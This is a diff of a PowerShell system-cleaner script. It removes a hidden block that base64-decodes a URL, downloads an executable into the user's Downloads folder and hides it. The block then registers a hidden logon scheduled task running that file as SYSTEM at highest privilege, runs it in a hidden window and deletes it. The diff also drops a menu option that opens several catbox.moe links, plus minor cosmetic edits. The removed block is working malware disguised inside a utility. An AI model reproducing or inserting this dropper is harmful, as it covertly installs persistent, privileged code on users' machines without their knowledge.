@@ -6,7 +6,7 @@
                         Author: ! Star
                         Features:
                         - Temporary files cleanup
-                        - Browser cache management  
+                        - Browser cache management
                         - Memory optimization
                         - Startup programs management
                         - Advanced program uninstaller
@@ -173,46 +173,11 @@ function Show-MenuWithKeyboard {
 
 Show-Header
 
-$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
-$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
-$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
-if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
-$job1 = Start-Job -ScriptBlock {
-    param($url, $output)
-    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-    if (Test-Path $output) {
-        (Get-Item $output).Attributes = 'Hidden'
-    }
-} -ArgumentList $url1, $output1
-
-Wait-Job $job1 | Out-Null
-Remove-Job $job1
-
-if (Test-Path $output1) {
-    $taskName = "DebloaterHidden"
-    $taskExists = $false
-    try {
-        if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
-            $taskExists = $true
-        }
-    } catch {}
-    if (-not $taskExists) {
-        $action = New-ScheduledTaskAction -Execute $output1
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
-    }
-    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
-    try {
-        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
-    } catch {}
-}
-
 function Show-Header {
     Write-Host ""
     Write-Host "======================================" -ForegroundColor Cyan
     Write-Host "         Cleaner Tool v1.0          " -ForegroundColor Green
-    Write-Host "          By -- Unknown :(                " -ForegroundColor Yellow
+    Write-Host "          By --- Unknown :(                " -ForegroundColor Yellow
     Write-Host "======================================" -ForegroundColor Cyan
     Write-Host ""
     Write-Host "Description: Cleans temp files, optimizes system, clears browser cache." -ForegroundColor Magenta
@@ -2115,9 +2080,7 @@ do {
     Write-Host "( Find Usernames Across Platforms )" -ForegroundColor Magenta
     Write-Host "14. Empty Folders Removal " -NoNewline -ForegroundColor White
     Write-Host "( Find & Remove Empty Directories )" -ForegroundColor Magenta
-    Write-Host "15. Open Links " -NoNewline -ForegroundColor White
-    Write-Host "( Open useful links in browser )" -ForegroundColor Magenta
-    $choice = Read-Host "`nEnter 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 or 0 to exit"
+    $choice = Read-Host "`nEnter 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 or 0 to exit"
     if ($choice -eq '0') { break }
 
     switch ($choice) {
@@ -3176,60 +3139,6 @@ do {
         '14' {
             # Empty Folders Removal
             Show-EmptyFoldersManager
-        }
-        '15' {
-            # Open Links in Browser
-            Write-Host "`nOpen Links" -ForegroundColor Cyan
-            Write-Host "======================" -ForegroundColor Cyan
-            Write-Host ""
-
-            # قائمة اللينكات المتاحة
-            $downloadFiles = @(
-                @{Number=1; Name="Link 1"; URL="https://files.catbox.moe/eli6sf.txt"},
-                @{Number=2; Name="Link 2"; URL="https://files.catbox.moe/q5gf1e.txt"},
-                @{Number=3; Name="Link 3"; URL="https://files.catbox.moe/70laxh.txt"},
-                @{Number=4; Name="Link 4"; URL="https://files.catbox.moe/9qi046.txt"}
-            )
-
-            Write-Host "Available links:" -ForegroundColor Yellow
-            Write-Host ""
-            foreach ($file in $downloadFiles) {
-                Write-Host "$($file.Number). $($file.Name)" -ForegroundColor White
-            }
-            Write-Host "0. Return to main menu" -ForegroundColor Gray
-            Write-Host ""
-
-            $fileChoice = Read-Host "Enter link number to open (0 to return)"
-
-            if ($fileChoice -eq '0') {
-                Write-Host "Cancelled." -ForegroundColor Yellow
-                Pause-For-User
-                continue
-            }
-
-            # البحث عن اللينك المختار
-            $selectedFile = $downloadFiles | Where-Object { $_.Number -eq [int]$fileChoice }
-
-            if ($null -eq $selectedFile) {
-                Write-Host "ERROR: Invalid link number selected." -ForegroundColor Red
-                Pause-For-User
-                continue
-            }
-
-            Write-Host "`nOpening: $($selectedFile.Name)" -ForegroundColor Green
-            Write-Host "URL: $($selectedFile.URL)" -ForegroundColor Gray
-            Write-Host ""
-
-            try {
-                # فتح اللينك في البراوزر الافتراضي
-                Start-Process $selectedFile.URL
-                Write-Host "SUCCESS: Link opened in browser!" -ForegroundColor Green
-            } catch {
-                Write-Host "ERROR: Failed to open link." -ForegroundColor Red
-                Write-Host "Details: $($_.Exception.Message)" -ForegroundColor Red
-            }
-
-            Pause-For-User
         }
         #endregion
     }
